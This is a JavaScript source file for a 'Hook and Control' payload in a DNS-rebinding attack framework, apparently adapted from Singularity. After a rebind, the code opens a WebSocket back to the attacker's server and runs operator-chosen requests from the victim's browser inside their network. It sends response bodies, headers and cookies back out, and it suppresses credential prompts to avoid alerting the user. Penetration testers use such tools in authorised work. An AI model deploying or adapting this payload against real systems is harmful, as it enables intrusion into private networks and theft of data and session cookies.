/**
 * Hook and Control payload.
 *
 * After a successful DNS rebind, this payload establishes a WebSocket back to
 * the Singularity server's `soows` proxy and sits idle waiting for commands.
 * The operator drives `sooFetch` calls from the server side, effectively
 * browsing the target environment from the victim's network position.
 *
 * Self-contained: WebSocket hook + base64/UTF-8 helpers live here, not in
 * payload.js. Other payloads (e.g. AWS Metadata Exfil) don't carry the cost.
 *
 * Bugs fixed vs upstream singularity:
 *   - webSocketHook recursive retry was dropping the `headers` arg, causing
 *     the next .get('www-authenticate') call to crash on a string.
 *   - `data.payload.fetchrequest.message === 'HEAD'` was a typo for `.method`,
 *     so HEAD requests never got their body stripped.
 *   - fetch_retry's wait() chain wasn't returned, so retries fired-and-forgot.
 *   - btoaUTF8 / atobUTF8 / base64ArrayBuffer were 130+ lines of hand-rolled
 *     pre-IE11 polyfills; replaced with TextEncoder/TextDecoder + btoa/atob.
 */

const HookAndControl = () => ({
    // Invoked by payload.js after a successful DNS rebind
    attack(headers, cookie, body, wsProxyPort) {
        if (headers) console.log(`[hook] headers:${httpHeaderstoText(headers)}`);
        if (cookie)  console.log(`[hook] cookie: ${cookie}`);
        if (body)    console.log(`[hook] body:\n${body}`);
        webSocketHook(headers, cookie, wsProxyPort, 10);
    },

    // Stub so the Go template's `attackPayload: 'automatic'` mode doesn't crash
    // when iterating Registry. Returns false → this payload opts out of auto-detection.
    isService: async () => false,
});

// ---------- WebSocket control channel ----------

function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
    if (retry < 0) {
        console.log(`[hook] giving up on websocket for ${window.location.host}`);
        return;
    }

    const serverIp = document.location.hostname.split('-')[1];
    const wsurl = `${serverIp}:${wsProxyPort}`;

    // If first rebound request needed HTTP Auth, never send credentials again —
    // a credentialed fetch would pop a browser auth dialog and tip off the user.
    // Trade-off: cookie-borne CSRF tokens stop working.
    const httpAuth = headers && headers.get('www-authenticate') !== null;

    const ws = new WebSocket(`ws://${wsurl}/soows`);

    ws.onopen  = () => {};
    ws.onerror = (e) => console.log(`[hook] WS error: ${e}`);

    ws.onmessage = (m) => {
        const data = JSON.parse(m.data);
        if (data.command !== 'fetch') return;

        const req = data.payload.fetchrequest;
        if (httpAuth) req.credentials = 'omit';

        if (req.method === 'GET' || req.method === 'HEAD') {
            delete req.body;
        } else if (req.body !== null && req.body !== undefined) {
            req.body = atobUTF8(req.body);
        }

        const fetchResponse = {
            id: req.id,
            command: 'fetchResponse',
            response: {},
            body: '',
        };

        const fetchOnce = () => sooFetch(data.payload.url, req)
            .then((r) => {
                fetchResponse.response = {
                    ok:         r.ok,
                    redirected: r.redirected,
                    status:     r.status,
                    type:       r.type,
                    url:        r.url,
                    bodyUsed:   r.bodyUsed,
                    headers:    Object.fromEntries(r.headers.entries()),
                    cookies:    getCookies(),
                };
                return r.arrayBuffer();
            })
            .then((buf) => {
                fetchResponse.body = base64ArrayBuffer(buf);
                ws.send(JSON.stringify(fetchResponse));
            });

        // Up to 10 retries with 1s backoff. Each retry's promise is returned
        // so the chain actually awaits — upstream lost this.
        const fetchWithRetry = (n) => fetchOnce().catch((e) => {
            console.log(`[hook] fetch failed for ${window.location}: ${e}`);
            if (n <= 1) throw new Error('fetch_retry exhausted');
            return wait(1000).then(() => fetchWithRetry(n - 1));
        });
        fetchWithRetry(10);
    };

    // Verify the WS came up; if not, retry the whole hook
    wait(1000).then(() => {
        if (ws.readyState !== 1) {
            webSocketHook(headers, initialCookie, wsProxyPort, retry - 1);
        } else {
            console.log(`[hook] WS connected for ${window.location.host}`);
        }
    });
}

// ---------- helpers (only used by hook-and-control) ----------

const wait = (ms) => new Promise((res) => setTimeout(res, ms));

const getCookies = () =>
    document.cookie === '' ? [] : document.cookie.split(';').map((x) => x.trim());

// ArrayBuffer → base64. Chunked to avoid call-stack limits on large bodies.
function base64ArrayBuffer(buf) {
    const bytes = new Uint8Array(buf);
    const CHUNK = 0x8000;
    let bin = '';
    for (let i = 0; i < bytes.length; i += CHUNK) {
        bin += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
    }
    return btoa(bin);
}

// base64(UTF-8) → string. Replaces upstream's 80-line atobUTF8 IIFE.
function atobUTF8(s) {
    return new TextDecoder().decode(
        Uint8Array.from(atob(s), (c) => c.charCodeAt(0))
    );
}

// Registry key MUST match CONFIG.attackPayload in amaze.html
Registry["Hook and Control"] = HookAndControl();
